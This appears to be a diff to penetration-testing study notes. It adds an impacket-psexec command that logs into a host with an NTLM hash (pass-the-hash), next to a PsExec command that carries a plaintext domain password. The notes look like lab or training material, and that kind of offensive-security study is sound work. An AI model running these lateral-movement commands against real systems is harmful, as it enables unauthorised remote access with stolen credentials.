@@ -459,6 +459,10 @@ Enter-PSSession <session-id>
 ```
 ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
 ```
+On Kali:
+```
+impacket-psexec 192.168.248.72 /user:jeffadmin /ntlm:e460605a9dbd55097c6cf77af2f89a03
+```
 
 ## Pass the Hash
 
